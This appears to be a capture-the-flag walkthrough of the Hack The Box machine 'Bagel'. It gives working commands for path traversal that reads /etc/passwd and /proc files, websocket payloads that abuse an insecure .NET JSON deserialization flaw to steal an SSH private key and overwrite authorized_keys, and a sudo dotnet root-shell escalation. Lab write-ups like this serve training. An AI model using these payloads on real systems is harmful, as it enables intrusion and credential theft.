Bagel is a medium difficulty linux machine created by [**CestLaVie**](https://app.hackthebox.com/users/298338) on [**Hack the Box**](https://app.hackthebox.com/machines/Bagel) that features a vulnerable web server that can be manipulated to read unintended files from the local filesystem. We exploit this to download the .NET assembly associated with a websocket listener on port 5000. This websocket server turns out to also be vulnerable to an unrestricted file read, which we use to read the private SSH key of the user _phil_. We use the foothold as this user to login as another user named _developer_ using previously found credentials. Under the _developer_ user, we can run `/usr/bin/dotnet`{:.filepath} as _root_ using sudo. This exception allows us to indirectly spawn an interactive shell as _root_ then read the final flag.

## Initial Recon

Let's first set up our environment and run a TCP port scan with [this custom nmap wrapper](https://github.com/bryanmcnulty/ctf-scripts/blob/main/recon/active/ctf-portscan.sh).

```bash
# bryan@attacker
rhost="10.10.11.201" # Target IP address
lhost="10.10.14.4" # Your VPN IP address
echo rhost=$rhost >> .env
echo lhost=$lhost >> .env
. ./.env && ctfscan $rhost
```
{:.nolineno}

The open TCP ports reported in the scan include:

| Port | Service | Product           | Version        |
|:-----|:--------|:------------------|:---------------|
| 22   | SSH     | OpenSSH           | 8.8            |
| 5000 | HTTP    | Microsoft-NetCore | 1.18.0         |
| 8000 | HTTP    | Werkzeug / Python | 2.2.2 / 3.10.9 |

We'll begin by investigating port **8000** because a standard HTTP request to port **5000** prompts an error, while port 8000 responds fine.

## Port 8000

When we send a standard GET request to the HTTP server on port 8000, we are redirected to [http://bagel.htb:8000/?page=index.html](http://bagel.htb:8000/?page=index.html). Let's add this hostname to `/etc/hosts`{:.filepath} so we can access the intended site.

```bash
# bryan@attacker
echo 'vhost=("bagel.htb")' >> .env && . ./.env
echo -e "$rhost\\t$vhost" | sudo tee -a /etc/hosts
```
{:.nolineno}

Now we'll visit the site in a browser session that is routed through our local [BurpSuite](https://portswigger.net/burp) proxy.

![Home Page](homepage.png)

The home page doesn't seem to have any useful information on it, but it does have a sketchy way of dynamically loading HTML content. The _page_ parameter is presumably used to fetch a file off of the local filesystem, which could potentially be abused to read sensitive files.

### File Read

It turns out, we can read files outside of our working directory such as `/etc/passwd`{:.filepath}.

```bash
# bryan@attacker
curl "http://bagel.htb:8000/?page=../../../../etc/passwd" # read /etc/passwd
```
{:.nolineno}

Let's read `/proc/self/cmdline`{:.filepath} and `/proc/self/environ`{:.filepath} to learn more about the current process.

```bash
# bryan@attacker
curl "http://bagel.htb:8000/?page=../../../../proc/self/cmdline" -so- | tr \\0 " "
curl "http://bagel.htb:8000/?page=../../../../proc/self/environ" -so- | tr \\0 \\n
```
{:.nolineno}

From the  environment variables, we learn that the current user is _developer_ with the home directory at `/home/developer`{:.filepath}. From the command line arguments, we learn that the web server's source code is at `/home/developer/app/app.py`{:.filepath}. Let's read the app's source to look for a path forward.

```bash
# bryan@attacker
curl "http://bagel.htb:8000/?page=../../../../home/developer/app/app.py" -o app.py
```
{:.nolineno}

```python
from flask import Flask, request, send_file, redirect, Response
import os.path
import websocket,json

app = Flask(__name__)

@app.route('/')
def index():
  if 'page' in request.args:
    page = 'static/'+request.args.get('page')
    if os.path.isfile(page):
      resp=send_file(page)
      resp.direct_passthrough = False
      if os.path.getsize(page) == 0:
        resp.headers["Content-Length"]=str(len(resp.get_data()))
        return resp
    else:
      return "File not found"
  else:
    return redirect('http://bagel.htb:8000/?page=index.html', code=302)

@app.route('/orders')
def order(): # don't forget to run the order app first with "dotnet <path to .dll>" command. Use your ssh key to access the machine.
  try:
    ws = websocket.WebSocket()  
    ws.connect("ws://127.0.0.1:5000/") # connect to order app
    order = {"ReadOrder":"orders.txt"}
    data = str(json.dumps(order))
    ws.send(data)
    result = ws.recv()
    return(json.loads(result)['ReadOrder'])
  except:
    return("Unable to connect")

if __name__ == '__main__':
  app.run(host='0.0.0.0', port=8000)
```
{:file="app.py"}

The `/orders`{:.filepath} route establishes a websocket connection to local port 5000. The client then sends some JSON content requesting a file, and reads the response which is probably the file contents. There are also some interesting comments referring to the service on port 5000 as the "order app" and suggesting that the it is a .NET assembly. Let's see if we can find the location of the order app by fuzzing processes with command line arguments.

```bash
# bryan@attacker
for i in {1..9999}; do echo "proc/$i/cmdline"; done > cmdls.txt
ffuf -u "http://bagel.htb:8000/?page=../../../../FUZZ" -w cmdls.txt -fr 'File not found' -fs 0 -od match
tail -n1 match/* | tr \\0 ' ' | grep -v ^==\> | sort -u
```
{:.nolineno}

We find a process with the arguments `dotnet /opt/bagel/bin/Debug/net6.0/bagel.dll`, which is probably the order app process. Now we'll download the assembly at `/opt/bagel/bin/Debug/net6.0/bagel.dll`{:.filepath} and decompile it using [ILSpy](https://github.com/icsharpcode/AvaloniaILSpy) or [DNSpy](https://github.com/dnSpy/dnSpy).

```bash
# bryan@attacker
curl "http://bagel.htb:8000/?page=../../../../opt/bagel/bin/Debug/net6.0/bagel.dll" -o bagel.dll
file bagel.dll # Correct format
```
{:.nolineno}

## Order App

The assembly only has one relevant namespace called *bagel_server*, which we will be working with from now on.

![ILSpy Main](ilspy.png)

### Hard-Coded Credentials

As we browse the decompilation we encounter a set of hard-coded database credentials in the *DB.DB_connection* method. The username used is **dev** and the associated password is **k8wdAYYKyhnjg3K**.

![Hard-Coded Credentials](hard-coded.png)

We try to spray this password against the list of console users we found in `/etc/passwd`{:.filepath} over SSH, but it looks like the SSH server does not accept password-based authentication.

### Code Review

The method **Bagel.Main**, which is defined as the entry point, calls _InitializeServer_ and _StartServer_, then enters an infinite loop.

```c#
// bagel_server.Bagel
using System.Threading;

private static void Main(string[] args) {
  InitializeServer();
  StartServer();
  while (true) {
    Thread.Sleep(1000);
  }
}
```

_Bagel.InitializeServer_ initializes the websocket server with the _Bagel.MessageReceived_ method as the message handler. Looking at _Bagel.MessageReceived_, it appears that any valid JSON messages will be sent to _Handler.Deserialize_, then re-serialized with _Handler.Serialize_. The product is then returned to the client via websocket.

```c#
// bagel_server.Bagel
using System.Text;
using System.Threading;
using WatsonWebsocket;

private static void MessageReceived(object sender, MessageReceivedEventArgs args) {
  string json = "";
  if (args.get_Data() != null && args.get_Data().Count > 0) {
    json = Encoding.UTF8.GetString(args.get_Data().Array, 0, args.get_Data().Count);
  }
  Handler handler = new Handler();
  object obj = handler.Deserialize(json);
  object obj2 = handler.Serialize(obj);
  _Server.SendAsync(args.get_IpPort(), obj2.ToString(), default(CancellationToken));
}
```

In *bagel_server.Handler*, it appears that _Serialize_ and _Deserialize_ use the **Newtonsoft.Json** library.

```c#
// bagel_server.Handler
using bagel_server;
using Newtonsoft.Json;

public object Serialize(object obj) {
  return JsonConvert.SerializeObject(obj, Formatting.Indented, new JsonSerializerSettings{
    TypeNameHandling = TypeNameHandling.Auto
  });
}

public object Deserialize(string json) {
  try {
    return JsonConvert.DeserializeObject<Base>(json, new JsonSerializerSettings{
      TypeNameHandling = TypeNameHandling.Auto
    });
  } catch {
    return "{\"Message\":\"unknown\"}";
  }
}
```

After some research, we discover that with _TypeNameHandling_ set to _TypeNameHandling.Auto_ in the serializer settings, the string passed to _Deserialize_ can instantiate objects of any type using the **$type** key. With that being said, it is required that the data can be cast to *Base* without encountering an error. This behavior can be classified as a restricted form of insecure deserialization.

### Insecure Deserialization

Within the *Orders* class, there are three public properties: _RemoveOrder_, _WriteOrder_, and _ReadOrder_. These properties are inherited by *Base*, which we can observe when sending a request with [this simple websocket client](https://github.com/bryanmcnulty/ctf-scripts/blob/main/web/wscurl.py).

```bash
# bryan@attacker
wscurl "ws://bagel.htb:5000"
```
{:.nolineno}
>
```json
{
  "UserId": 0,
  "Session": "Unauthorized",
  "Time": "1:42:27",
  "RemoveOrder": null,
  "WriteOrder": null,
  "ReadOrder": null
}
```

The _RemoveOrder_ property is of particular interest to us because it is defined as an object rather than a string, which means we could use the deserialization flaw we found earlier to instantiate an object of any given class. Exploiting this on a Windows based machine would be fairly trivial due to the amount of known RCE gadgets ([more reading](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html#net-csharp)).

#### File Class

There is a class called *File* that performs some potentially dangerous actions involving the filesystem. Two properties in particular: _ReadFile_ and _WriteFile_, will perform actions when their values are read or written to using _get/set_ statements.

```c#
// bagel_server.File
using System;
using System.Collections.Generic;
using System.IO;
using System.Text;

public class File
{
  private string file_content;
  private string IsSuccess = null;
  private string directory = "/opt/bagel/orders/";
  private string filename = "orders.txt";
  public string ReadFile {
    get {
      return file_content;
    }
    set {
      filename = value;
      ReadContent(directory + filename);
    }
  }
  public string WriteFile {
    get {
      return IsSuccess;
    } set {
      WriteContent(directory + filename, value);
    }
  }

  public void ReadContent(string path) {
    try {
      IEnumerable<string> values = File.ReadLines(path, Encoding.UTF8);
      file_content += string.Join("\n", values);
    } catch (Exception) {
      file_content = "Order not found!";
    }
  }

  public void WriteContent(string filename, string line) {
    try {
      File.WriteAllText(filename, line);
      IsSuccess = "Operation successed";
    } catch (Exception) {
      IsSuccess = "Operation failed";
    }
  }
}
```

##### Unrestricted File Read

The _ReadFile_ property takes the location of the intended directory (`/opt/bagel/orders/`{:.filepath}) and directly concatenates it with the value from the _set_ statement. This could be abused using the `../`{:.filepath} sequence to read any available file under the context of the current process. Let's put everything together and try to read `/etc/passwd`{:.filepath}.

All this payload should do is specify the object class as *bagel_server.File* by setting the *$type* key to the appropriate value, and pass the file path to the *ReadFile* property.

```bash
# bryan@attacker
type="bagel_server.File, bagel" # in the format `class, assembly`
read="../../../etc/passwd" # read this file
wscurl "ws://bagel.htb:5000" -d '{"RemoveOrder":{"$type":"'$type'","ReadFile":"'$read'"}}'
```
{:.nolineno}

The contents are successfully returned in the value of _ReadFile_. Now let's read something a bit more interesting like the process environment variables.

```bash
# bryan@attacker
read="../../../proc/self/environ" # read this file
wscurl "ws://bagel.htb:5000" -d '{"RemoveOrder":{"$type":"'$type'","ReadFile":"'$read'"}}'
```
{:.nolineno}

The _USER_ environment variable tells us that this process is running as the user **phil**. Knowing the process user, we request `/home/phil/.ssh/id_rsa`{:.filepath} which yields phil's private SSH key.

##### Unrestricted File Write (Extra Credit)

It turns out, we can also use the insecure deserialization to write files as _phil_. This is possible because we can make _ReadFile_ change the filename property before _WriteFile_ accesses it. If we pack an assignment to _ReadFile_ then _WriteFile_ into a single object, we can effectively overwrite files with content of our choice.

```bash
# bryan@attacker
public=$(cat ~/.ssh/id_rsa.pub | cut -d\  -f-2) # Get SSH public key
file="../../../home/phil/.ssh/authorized_keys" # Write to this file
wscurl "ws://bagel.htb:5000" \
  -d '{"RemoveOrder":{"$type":"'$type'","ReadFile":"'$file'","WriteFile":"'$public'"}}'
```
{:.nolineno}

## Privilege Escalation

Now that we have established a proper shell we can check if [the password we found earlier](#hard-coded-credentials) is valid on any accounts.

```bash
# bryan@attacker
chmod 600 phil_id_rsa 
ssh -i phil_id_rsa phil@bagel.htb
```
{:.nolineno}
```bash
# phil@bagel.htb (SSH)
su developer
```
{:.nolineno}

The login is successful for the user _developer_.

### Developer

Using the `sudo -l` command, we discover that _developer_ can run `/usr/bin/dotnet`{:.filepath} as root.

>
```
User developer may run the following commands on bagel:
    (root) NOPASSWD: /usr/bin/dotnet
```

A quick reference to [GTFOBins](https://gtfobins.github.io/gtfobins/dotnet/) reveals that we can abuse this exception to get a shell as root.

```bash
# developer@bagel.htb (SSH)
TF=$(mktemp --suffix=.fsx)
echo 'System.Diagnostics.Process.Start("/bin/sh").WaitForExit();;' > $TF
sudo /usr/bin/dotnet fsi $TF
```
{:.nolineno}
